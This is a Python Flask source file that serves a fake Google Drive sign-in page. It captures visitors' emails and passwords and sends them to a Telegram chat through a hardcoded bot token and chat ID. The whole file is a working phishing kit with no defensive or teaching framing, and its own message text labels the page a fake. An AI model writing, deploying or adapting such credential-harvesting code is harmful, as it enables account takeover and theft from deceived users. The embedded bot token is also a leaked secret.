from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)

# --- Telegram Bot Details ---
BOT_TOKEN = "7901711799:AAEWnySjRO5KgEMpUQmz7fwnYzlumt_AlX4"
CHAT_ID = "6908281054"

# --- HTML Login Page Template ---
login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in – Google Drive</title>
  <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background: #f1f1f1;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px 30px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
      transition: all 0.3s ease-in-out;
    }
    .login-box img {
      width: 80px;
      display: block;
      margin: 0 auto 20px;
    }
    .login-box h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #202124;
    }
    .input-field { position: relative; }
    input {
      width: 100%;
      padding: 12px 40px 12px 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    input:focus {
      border-color: #1a73e8;
      outline: none;
      box-shadow: 0 0 3px #1a73e8;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #888;
    }
    button {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }
    .loading { display: none; text-align: center; margin-top: 15px; }
    .loading.show { display: block; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" alt="Google Drive">
    <h2>Sign in</h2>
    <form id="loginForm" action="/token" method="POST">
      <input type="email" name="email" placeholder="Email or phone" required>
      <div class="input-field">
        <input type="password" name="password" id="password" placeholder="Enter your password" required>
        <span class="toggle-password" onclick="togglePassword()">👁️</span>
      </div>
      <button type="submit">Next</button>
      <div class="loading" id="loading">🔄 Please wait...</div>
    </form>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("password");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', function () {
      document.getElementById('loading').classList.add('show');
    });
  </script>
</body>
</html>
"""

# --- Send to Telegram Function ---
def send_to_telegram(email, password):
    message = f"""
🔐 <b>New Login Attempt</b>
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🕵️‍♂️ <i>From: Google Drive Fake Page</i>
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print("❌ Telegram Send Error:", e)

# --- Routes ---
@app.route('/')
def index():
    return render_template_string(login_html)

@app.route('/token', methods=['POST'])
def token():
    email = request.form.get('email')
    password = request.form.get('password')

    # Send to Telegram
    send_to_telegram(email, password)

    # Confirmation Page
    return f"""
    <h2>Welcome, {email}</h2>
    <p>This is a dummy dashboard. Your data has been received.</p>
    <a href='/'>Back to Login</a>
    """

# --- Run the App ---
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
